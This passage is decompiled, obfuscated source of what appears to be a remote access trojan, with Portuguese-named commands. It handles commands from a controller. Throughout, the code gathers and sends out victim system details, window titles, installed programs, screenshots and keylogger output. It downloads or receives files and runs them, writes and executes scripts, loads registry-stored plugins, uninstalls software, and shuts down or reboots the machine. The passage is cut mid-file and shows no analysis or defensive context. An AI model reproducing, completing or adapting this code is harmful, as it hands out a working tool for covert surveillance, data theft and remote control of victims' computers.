          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "PermisaoGJanelas", false) == 0)
          \u0040Ә.\u0040\u0589("EnviarPermitirForm" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "EnviarJanelasFf", false) == 0)
        {
          string str = "";
          Process[] processes = Process.GetProcesses(".");
          int index = 0;
          while (index < processes.Length)
          {
            Process process = processes[index];
            try
            {
              if (process.MainWindowTitle.Length > 0)
                str = str + process.MainWindowTitle + "%|%" + process.Handle.ToString() + "%|%\r\n";
            }
            catch (Exception ex)
            {
              ProjectData.SetProjectError(ex);
              ProjectData.ClearProjectError();
            }
            checked { ++index; }
          }
          \u0040Ә.\u0040\u0589("EnviarPermitirFormJanelas" + \u0040Ә.\u0040Ի + str + \u0040Ә.\u0040Ի);
        }
        else if (Operators.CompareString(Left2, "PrimsaoFormProgramas", false) == 0)
          \u0040Ә.\u0040\u0589("ChamaFormProgramas" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "EnviarListaProgramas", false) == 0)
        {
          try
          {
            string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\";
            string[] subKeyNames = Registry.LocalMachine.OpenSubKey(name).GetSubKeyNames();
            int index = 0;
            string Left29;
            while (index < subKeyNames.Length)
            {
              string str = subKeyNames[index];
              Left29 = Conversions.ToString(Operators.AddObject((object) Left29, Operators.ConcatenateObject(Operators.ConcatenateObject(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\" + str + "\\", "DisplayName", (object) "N/A"), (object) "%|%"), (object) "\r\n")));
              checked { ++index; }
            }
            \u0040Ә.\u0040\u0589("LiiiistaProgramas" + \u0040Ә.\u0040Ի + Left29 + \u0040Ә.\u0040Ի);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "DesinsTalarProgramass", false) == 0)
        {
          try
          {
            string name13 = "Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall";
            string empty = string.Empty;
            RegistryKey registryKey1 = MyProject.Computer.Registry.LocalMachine.OpenSubKey(name13);
            string[] subKeyNames = registryKey1.GetSubKeyNames();
            int index = 0;
            while (index < subKeyNames.Length)
            {
              string name14 = subKeyNames[index];
              RegistryKey registryKey2 = registryKey1.OpenSubKey(name14);
              if (Operators.CompareString(Conversions.ToString(registryKey2.GetValue("DisplayName", (object) "")), strArray1[1], false) == 0)
                NewLateBinding.LateCall((object) null, typeof (Process), "Start", new object[1]
                {
                  RuntimeHelpers.GetObjectValue(registryKey2.GetValue("UninstallString", (object) ""))
                }, (string[]) null, (System.Type[]) null, (bool[]) null, true);
              checked { ++index; }
            }
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "EnviarPermisaoDeInfomacaoParaServidor", false) == 0)
          \u0040Ә.\u0040\u0589("ChamaFormInformacao" + \u0040Ә.\u0040Ի + Environment.UserName + "/" + Environment.MachineName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "TextoInformacoes", false) == 0)
        {
          try
          {
            Application.DoEvents();
            string str3 = Application.ExecutablePath + \u0040Ә.\u0040Ի;
            string str4 = System.IO.File.GetAttributes(Application.ExecutablePath).ToString() + \u0040Ә.\u0040Ի;
            string str5 = \u0040Ә.\u0040ӡ + \u0040Ә.\u0040Ի;
            string str6 = \u0040Ә.\u0040Ե + \u0040Ә.\u0040Ի;
            string str7 = \u0040Ә.\u0040ӥ + \u0040Ә.\u0040Ի;
            string str8 = \u0040Ә.\u0040Ӣ + \u0040Ә.\u0040Ի;
            string str9 = Conversions.ToString(Operators.ConcatenateObject(\u0040Ә.\u0040գ(), (object) \u0040Ә.\u0040Ի));
            string str10 = "127.0.0.1" + \u0040Ә.\u0040Ի;
            string str11 = NetworkInterface.GetAllNetworkInterfaces()[0].GetPhysicalAddress().ToString() + \u0040Ә.\u0040Ի;
            string str12 = SystemInformation.ComputerName + \u0040Ә.\u0040Ի;
            string str13 = SystemInformation.UserDomainName + \u0040Ә.\u0040Ի;
            string str14 = SystemInformation.UserName + \u0040Ә.\u0040Ի;
            string str15 = SystemInformation.MonitorCount.ToString() + \u0040Ә.\u0040Ի;
            string str16 = SystemInformation.VirtualScreen.Width.ToString() + "x" + SystemInformation.VirtualScreen.Height.ToString() + \u0040Ә.\u0040Ի;
            string str17 = MyProject.Computer.Info.OSFullName + \u0040Ә.\u0040Ի;
            string str18 = MyProject.Computer.Info.OSPlatform + \u0040Ә.\u0040Ի;
            string str19 = MyProject.Computer.Info.OSVersion + \u0040Ә.\u0040Ի;
            string str20 = Conversions.ToString(Operators.ConcatenateObject(\u0040Ә.\u0040ե((object) MyProject.Computer.Info.TotalPhysicalMemory), (object) \u0040Ә.\u0040Ի));
            string str21 = SystemInformation.PowerStatus.BatteryChargeStatus.ToString() + " (" + Conversions.ToString(SystemInformation.PowerStatus.BatteryLifePercent * 100f) + "%)" + \u0040Ә.\u0040Ի;
            string str22 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str23 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winsat", "PrimaryAdapterString", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str24 = string.Empty + Conversions.ToString(Math.Round((double) Environment.TickCount / 86400000.0)) + " Dias, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 3600000.0 % 24.0)) + " Horas, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 120000.0 % 60.0)) + " Minutos, " + Conversions.ToString(Math.Round((double) Environment.TickCount / 1000.0 % 60.0)) + " Segundos." + \u0040Ә.\u0040Ի;
            string str25 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "Identifier", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str26 = Conversions.ToString(MyProject.Computer.Clock.LocalTime) + \u0040Ә.\u0040Ի;
            string str27 = \u0040Ә.\u0040Հ() != Conversions.ToBoolean("True") ? "Não" + \u0040Ә.\u0040Ի : "Sim" + \u0040Ә.\u0040Ի;
            string str28 = \u0040Ә.\u0040Ծ();
            string str29 = \u0040Ә.\u0040Մ(ref str28) + \u0040Ә.\u0040Ի;
            string str30 = Environment.SystemDirectory + \u0040Ә.\u0040Ի;
            string str31 = MyProject.Computer.Info.InstalledUICulture.ToString() + \u0040Ә.\u0040Ի;
            string str32 = Conversions.ToString(Operators.ConcatenateObject(\u0040Ә.\u0040բ(), (object) \u0040Ә.\u0040Ի));
            string str33 = Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE").ToString() + "-based PC" + \u0040Ә.\u0040Ի;
            string str34 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "SystemProductName", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str35 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVendor", (object) "N/A"), (object) " "), MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSVersion", (object) "N/A")), (object) ", "), MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\BIOS", "BIOSReleaseDate", (object) "N/A")), (object) \u0040Ә.\u0040Ի));
            string str36 = Environment.UserName + \u0040Ә.\u0040Ի;
            string str37 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "RegisteredOrganization", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str38 = Conversions.ToString(Operators.ConcatenateObject(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductId", (object) "N/A"), (object) \u0040Ә.\u0040Ի));
            string str39 = Operators.CompareString(Conversions.ToString(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\PublicProfile", "EnableFirewall", (object) "N/A")), "0", false) != 0 ? "Ativado" + \u0040Ә.\u0040Ի : "Desativado" + \u0040Ә.\u0040Ի;
            \u0040Ә.\u0040\u0589("EnviaResultadoInformacoes" + \u0040Ә.\u0040Ի + str3 + str4 + str5 + str6 + str7 + str8 + str9 + str10 + str11 + str12 + str13 + str14 + str15 + str16 + str17 + str18 + str19 + str20 + str21 + str22 + str23 + str24 + str25 + str26 + str27 + str29 + str30 + str31 + str32 + str33 + str34 + str35 + str36 + str37 + str38 + str39 + \u0040Ә.\u0040Ի);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "infoDesk", false) == 0)
        {
          byte[] inArray = (byte[]) new ImageConverter().ConvertTo((object) \u0040Ә.\u0040զ(), _param0_1.GetType());
          \u0040Ә.\u0040\u0589(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("infoDesk" + \u0040Ә.\u0040Ի + Convert.ToBase64String(inArray) + \u0040Ә.\u0040Ի + \u0040Ә.\u0040ӥ + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ս() + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ӣ + \u0040Ә.\u0040Ի), RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ա()))), (object) \u0040Ә.\u0040Ի)), (object) \u0040Ә.\u0040ӡ))));
        }
        else if (Operators.CompareString(Left2, "anf", false) == 0)
          \u0040Ә.\u0040\u0589(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("anf" + \u0040Ә.\u0040Ի + \u0040Ә.\u0040ӥ + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ե + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ӣ + \u0040Ә.\u0040Ի + \u0040Ә.\u0040ӡ + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Ժ + \u0040Ә.\u0040Ի + \u0040Ә.\u0040Թ + \u0040Ә.\u0040Ի), RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040ա()))), (object) \u0040Ә.\u0040Ի)), (object) Environment.UserName)), (object) \u0040Ә.\u0040Ի)), (object) MyProject.Computer.Info.OSFullName)), (object) \u0040Ә.\u0040Ի)), RuntimeHelpers.GetObjectValue(MyProject.Computer.Registry.GetValue("HKEY_LOCAL_MACHINE\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", "ProcessorNameString", (object) "N/A"))))));
        else if (Operators.CompareString(Left2, "oadaee", false) == 0)
          \u0040Ә.\u0040\u0589("oadaee");
        else if (Operators.CompareString(Left2, "Doss", false) == 0)
          \u0040Ә.\u0040\u0589("Doss");
        else if (Operators.CompareString(Left2, "url", false) == 0)
          \u0040Ә.\u0040\u0589("url");
        else if (Operators.CompareString(Left2, "borr", false) == 0)
        {
          StreamWriter streamWriter = new StreamWriter(strArray1[1]);
          streamWriter.WriteLine(strArray1[2]);
          streamWriter.Close();
        }
        else if (Operators.CompareString(Left2, "oada", false) == 0)
        {
          System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
          Thread.Sleep(1000);
          \u0040Ә.\u0040\u0589("bla");
          string str = Path.GetTempPath() + strArray1[1];
          \u0040Ә.\u0040ծ(20, 0, ref str, 1);
        }
        else if (Operators.CompareString(Left2, "IEhome", false) == 0)
        {
          Clipboard.Clear();
          Clipboard.SetText(strArray1[1]);
        }
        else if (Operators.CompareString(Left2, "script", false) == 0)
        {
          string str = Environment.GetFolderPath(Environment.SpecialFolder.Templates) + "\\tempxxSD";
          MyProject.Computer.FileSystem.WriteAllText(str + strArray1[2], strArray1[1], false);
          Process.Start(str + strArray1[2]);
        }
        else if (Operators.CompareString(Left2, "ssstui", false) == 0)
          System.IO.File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + strArray1[1], Convert.FromBase64String(strArray1[2]));
        else if (Operators.CompareString(Left2, "sendfile", false) == 0)
        {
          System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
          Process.Start(Path.GetTempPath() + strArray1[1]);
        }
        else if (Operators.CompareString(Left2, "atHTTP", false) == 0)
          MyProject.Computer.Network.Ping(strArray1[1]);
        else if (Operators.CompareString(Left2, "atstop", false) == 0)
        {
          Process[] processesByName = Process.GetProcessesByName("PING");
          if (processesByName != null)
          {
            Process[] processArray = processesByName;
            int index = 0;
            while (index < processArray.Length)
            {
              processArray[index].Kill();
              checked { ++index; }
            }
          }
        }
        else if (Operators.CompareString(Left2, "EsconderBarraDeTarefas", false) == 0)
          \u0040Ә.\u0040ի((int) \u0040Ӛ.\u0040ӟ("Shell_traywnd", ""), 0, 0, 0, 0, 0, 128);
        else if (Operators.CompareString(Left2, "MostrarBarraDeTarefas", false) == 0)
          \u0040Ә.\u0040ի((int) \u0040Ӛ.\u0040ӟ("Shell_traywnd", ""), 0, 0, 0, 0, 0, 64);
        else if (Operators.CompareString(Left2, "MonitorON", false) == 0)
          \u0040Ә.\u0040ը(-1, 274U, 61808U, -1);
        else if (Operators.CompareString(Left2, "MonitorOFF", false) == 0)
          \u0040Ә.\u0040ը(-1, 274U, 61808U, 2);
        else if (Operators.CompareString(Left2, "opencd", false) == 0)
        {
          try
          {
            string str40 = "set cdaudio door open";
            ref string local1 = ref str40;
            string str41 = Conversions.ToString(0);
            ref string local2 = ref str41;
            \u0040Ә.\u0040լ(ref local1, ref local2, 0L, 0L);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "closecd", false) == 0)
        {
          try
          {
            string str42 = "set cdaudio door closed";
            ref string local3 = ref str42;
            string str43 = Conversions.ToString(0);
            ref string local4 = ref str43;
            \u0040Ә.\u0040լ(ref local3, ref local4, 0L, 0L);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
          }
        }
        else if (Operators.CompareString(Left2, "OpenPage", false) == 0)
          Process.Start(strArray1[1]);
        else if (Operators.CompareString(Left2, "sh", false) == 0)
          Interaction.Shell("Shutdown -l");
        else if (Operators.CompareString(Left2, "Shr", false) == 0)
          Interaction.Shell("Shutdown -r");
        else if (Operators.CompareString(Left2, "shs", false) == 0)
          Interaction.Shell("Shutdown -s");
        else if (Operators.CompareString(Left2, "TextToSpeech", false) == 0)
        {
          object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.Spvoice"));
          object[] objArray7 = new object[1];
          object[] objArray8 = objArray7;
          string[] strArray6 = strArray1;
          string[] strArray7 = strArray6;
          int index5 = 1;
          int index6 = index5;
          string str = strArray7[index6];
          objArray8[0] = (object) str;
          object[] objArray9 = objArray7;
          object[] Arguments = objArray9;
          bool[] flagArray = new bool[1]{ true };
          bool[] CopyBack = flagArray;
          NewLateBinding.LateCall(objectValue, (System.Type) null, "speak", Arguments, (string[]) null, (System.Type[]) null, CopyBack, true);
          if (flagArray[0])
            strArray6[index5] = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray9[0]), typeof (string));
        }
        else if (Operators.CompareString(Left2, "sendmusicplay", false) == 0)
        {
          System.IO.File.WriteAllBytes(Path.GetTempPath() + strArray1[1], Convert.FromBase64String(strArray1[2]));
          Thread.Sleep(1000);
          MyProject.Computer.Audio.Stop();
          MyProject.Computer.Audio.Play(Path.GetTempPath() + strArray1[1], AudioPlayMode.Background);
        }
        else if (Operators.CompareString(Left2, "NormalMouse", false) == 0)
          \u0040Ә.\u0040խ(0L);
        else if (Operators.CompareString(Left2, "ReverseMouse", false) == 0)
          \u0040Ә.\u0040խ(256L);
        else if (Operators.CompareString(Left2, "errorsound", false) == 0)
          MyProject.Computer.Audio.PlaySystemSound(SystemSounds.Asterisk);
        else if (Operators.CompareString(Left2, "ClockOFF", false) == 0)
          \u0040Ә.\u0040Ֆ();
        else if (Operators.CompareString(Left2, "ClockON", false) == 0)
          \u0040Ә.\u0040\u0557();
        else if (Operators.CompareString(Left2, "TaskbarShow", false) == 0)
          \u0040Ә.\u0040Օ();
        else if (Operators.CompareString(Left2, "TaskbarHide", false) == 0)
          \u0040Ә.\u0040Ք();
        else if (Operators.CompareString(Left2, "EnviarPermisaaaoMensagem", false) == 0)
          \u0040Ә.\u0040\u0589("ChamaFrmMensagemms" + \u0040Ә.\u0040Ի + Environment.MachineName + "/" + Environment.UserName + \u0040Ә.\u0040Ի);
        else if (Operators.CompareString(Left2, "EnviarMensagemFakker", false) == 0)
        {
          string Left30 = strArray1[1];
          MessageBoxIcon icon;
          if (Operators.CompareString(Left30, "1", false) == 0)
            icon = MessageBoxIcon.Asterisk;
          else if (Operators.CompareString(Left30, "2", false) == 0)
            icon = MessageBoxIcon.Question;
          else if (Operators.CompareString(Left30, "3", false) == 0)
            icon = MessageBoxIcon.Exclamation;
          else if (Operators.CompareString(Left30, "4", false) == 0)
            icon = MessageBoxIcon.Hand;
          string Left31 = strArray1[2];
          MessageBoxButtons buttons;
          if (Operators.CompareString(Left31, "1", false) == 0)
            buttons = MessageBoxButtons.YesNo;
          else if (Operators.CompareString(Left31, "2", false) == 0)
            buttons = MessageBoxButtons.YesNoCancel;
          else if (Operators.CompareString(Left31, "3", false) == 0)
            buttons = MessageBoxButtons.OK;
          else if (Operators.CompareString(Left31, "4", false) == 0)
            buttons = MessageBoxButtons.OKCancel;
          else if (Operators.CompareString(Left31, "5", false) == 0)
            buttons = MessageBoxButtons.RetryCancel;
          else if (Operators.CompareString(Left31, "6", false) == 0)
            buttons = MessageBoxButtons.AbortRetryIgnore;
          int num2 = (int) MessageBox.Show(strArray1[4], strArray1[3], buttons, icon);
        }
        else
        {
          if (Operators.CompareString(Left2, "ll", false) == 0)
          {
            \u0040Ә.\u0040Ӡ = false;
            return;
          }
          if (Operators.CompareString(Left2, "kl", false) == 0)
          {
            string ի = \u0040Ә.\u0040Ի;
            string str44 = \u0040Ӝ.\u0040Ӟ();
            string str45 = \u0040Ә.\u0040Շ(ref str44);
            \u0040Ә.\u0040\u0589("kl" + ի + str45);
          }
          else if (Operators.CompareString(Left2, "oada", false) == 0)
            \u0040Ә.\u0040\u058B(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
          else if (Operators.CompareString(Left2, "fransesco", false) == 0)
          {
            \u0040Ә.\u0040\u058B(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
            \u0040Ә.\u0040\u0589(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի), RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ(strArray1[1], (object) ""))))));
          }
          else if (Operators.CompareString(Left2, "ctraik", false) == 0)
            \u0040Ә.\u0040Յ(strArray1[2]);
          else if (Operators.CompareString(Left2, "prof", false) == 0)
          {
            string Left32 = strArray1[1];
            if (Operators.CompareString(Left32, "~", false) == 0)
            {
              \u0040Ә.\u0040\u058B(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              return;
            }
            if (Operators.CompareString(Left32, "!", false) == 0)
            {
              \u0040Ә.\u0040\u058B(strArray1[2], (object) strArray1[3], RegistryValueKind.String);
              \u0040Ә.\u0040\u0589(Conversions.ToString(RuntimeHelpers.GetObjectValue(Operators.ConcatenateObject((object) ("getvalue" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի), RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040Ռ(strArray1[1], (object) ""))))));
              return;
            }
            if (Operators.CompareString(Left32, "@", false) != 0)
              return;
            \u0040Ә.\u0040Յ(strArray1[2]);
            return;
          }
        }
      }
      if (Operators.CompareString(Left1, "rn", false) == 0)
      {
        byte[] bytes;
        if (strArray1[2][0] == '\u001F')
        {
          try
          {
            MemoryStream memoryStream = new MemoryStream();
            int length = (strArray1[0] + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի).Length;
            memoryStream.Write(_param0_1, length, checked (_param0_1.Length - length));
            bytes = \u0040Ә.\u0040\u058D(memoryStream.ToArray());
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Execute ERROR");
            \u0040Ә.\u0040\u0589("bla");
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            return;
          }
        }
        else
        {
          WebClient webClient = new WebClient();
          try
          {
            bytes = webClient.DownloadData(strArray1[2]);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Download ERROR");
            \u0040Ә.\u0040\u0589("bla");
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
            return;
          }
        }
        \u0040Ә.\u0040\u0589("bla");
        string str = Path.GetTempFileName() + "." + strArray1[1];
        try
        {
          System.IO.File.WriteAllBytes(str, bytes);
          Process.Start(str);
          \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Executed As " + new FileInfo(str).Name);
        }
        catch (Exception ex1)
        {
          ProjectData.SetProjectError(ex1);
          Exception ex2 = ex1;
          ProjectData.SetProjectError(ex2);
          Exception exception = ex2;
          \u0040Ә.\u0040\u0589("MSG" + \u0040Ә.\u0040Ի + "Execute ERROR " + exception.Message);
          ProjectData.ClearProjectError();
          ProjectData.ClearProjectError();
        }
      }
      else
      {
        string Left33 = Left1;
        if (Operators.CompareString(Left33, "inv", false) == 0)
        {
          byte[] numArray = (byte[]) \u0040Ә.\u0040Ռ(strArray1[1], (object) new byte[0]);
          if (strArray1[3].Length < 10 & numArray.Length == 0)
          {
            \u0040Ә.\u0040\u0589("pl" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[3].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի + strArray1[2] + \u0040Ә.\u0040Ի).Length;
              memoryStream.Write(_param0_1, length, checked (_param0_1.Length - length));
              numArray = \u0040Ә.\u0040\u058D(memoryStream.ToArray());
              \u0040Ә.\u0040\u058B(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            \u0040Ә.\u0040\u0589("pl" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040օ(numArray, "A"))));
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "h", new object[1]
            {
              (object) \u0040Ә.\u0040ӥ
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "p", new object[1]
            {
              (object) \u0040Ә.\u0040Ե
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "osk", new object[1]
            {
              (object) strArray1[2]
            }, (string[]) null, (System.Type[]) null);
            NewLateBinding.LateCall(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "start", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null, true);
            while (!Conversions.ToBoolean(RuntimeHelpers.GetObjectValue(Operators.OrObject((object) !\u0040Ә.\u0040Ӡ, RuntimeHelpers.GetObjectValue(Operators.CompareObjectEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "Off", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)), (object) true, false))))))
              Thread.Sleep(1);
            NewLateBinding.LateSet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "off", new object[1]
            {
              (object) true
            }, (string[]) null, (System.Type[]) null);
          }
        }
        else if (Operators.CompareString(Left33, "ret", false) == 0)
        {
          byte[] numArray = (byte[]) \u0040Ә.\u0040Ռ(strArray1[1], (object) new byte[0]);
          if (strArray1[2].Length < 10 & numArray.Length == 0)
          {
            \u0040Ә.\u0040\u0589("pl" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի + Conversions.ToString(1));
          }
          else
          {
            if (strArray1[2].Length > 10)
            {
              MemoryStream memoryStream = new MemoryStream();
              int length = (strArray1[0] + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի).Length;
              memoryStream.Write(_param0_1, length, checked (_param0_1.Length - length));
              numArray = \u0040Ә.\u0040\u058D(memoryStream.ToArray());
              \u0040Ә.\u0040\u058B(strArray1[1], (object) numArray, RegistryValueKind.Binary);
            }
            \u0040Ә.\u0040\u0589("pl" + \u0040Ә.\u0040Ի + strArray1[1] + \u0040Ә.\u0040Ի + Conversions.ToString(0));
            object objectValue = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(\u0040Ә.\u0040օ(numArray, "A"))));
            string[] strArray8 = new string[5]
            {
              "ret",
              \u0040Ә.\u0040Ի,
              strArray1[1],
              \u0040Ә.\u0040Ի,
              null
            };
            string[] strArray9 = strArray8;
            string str46 = Conversions.ToString(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(objectValue), (System.Type) null, "GT", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null)));
            string str47 = \u0040Ә.\u0040Շ(ref str46);
            strArray9[4] = str47;
            \u0040Ә.\u0040\u0589(string.Concat(strArray8));
          }
        }
        else if (Operators.CompareString(Left33, "CAP", false) == 0)
        {
          Rectangle targetRect = Screen.PrimaryScreen.Bounds;
          Bitmap bitmap1 = new Bitmap(Screen.PrimaryScreen.Bounds.Width, targetRect.Height, PixelFormat.Format16bppRgb555);
          Graphics g = Graphics.FromImage((Image) bitmap1);
          Size size = new Size(bitmap1.Width, bitmap1.Height);
          g.CopyFromScreen(0, 0, 0, 0, size, CopyPixelOperation.SourceCopy);
          try
          {
            size = new Size(32, 32);
            targetRect = new Rectangle(Cursor.Position, size);
            Cursors.Default.Draw(g, targetRect);
          }
          catch (Exception ex)
          {
            ProjectData.SetProjectError(ex);
            ProjectData.SetProjectError(ex);
            ProjectData.ClearProjectError();
            ProjectData.ClearProjectError();
          }
          g.Dispose();
          Bitmap bitmap2 = new Bitmap(Conversions.ToInteger(strArray1[1]), Conversions.ToInteger(strArray1[2]));
          Graphics graphics = Graphics.FromImage((Image) bitmap2);
          graphics.DrawImage((Image) bitmap1, 0, 0, bitmap2.Width, bitmap2.Height);
          graphics.Dispose();
          MemoryStream memoryStream1 = new MemoryStream();
          string str = "CAP" + \u0040Ә.\u0040Ի;
          _param0_1 = \u0040Ә.\u0040\u0588(ref str);
          memoryStream1.Write(_param0_1, 0, _param0_1.Length);
          MemoryStream memoryStream2 = new MemoryStream();
          bitmap2.Save((Stream) memoryStream2, ImageFormat.Jpeg);
          \u0040Ә.\u0040փ(memoryStream2.ToArray());
          string Left34;
          if (Operators.CompareString(Left34, \u0040Ә.\u0040Ա, false) != 0)
          {
            \u0040Ә.\u0040Ա = Left34;
            memoryStream1.Write(memoryStream2.ToArray(), 0, checked ((int) memoryStream2.Length));
          }
          else
            memoryStream1.WriteByte((byte) 0);
          \u0040Ә.\u0040\u058A(memoryStream1.ToArray());
          memoryStream1.Dispose();
          memoryStream2.Dispose();
          bitmap1.Dispose();
          bitmap2.Dispose();
        }
        else if (Operators.CompareString(Left33, "un", false) == 0)
        {
          string Left35 = strArray1[1];
          if (Operators.CompareString(Left35, "~", false) == 0)
            \u0040Ә.\u0040\u058C();
          else if (Operators.CompareString(Left35, "!", false) == 0)
          {
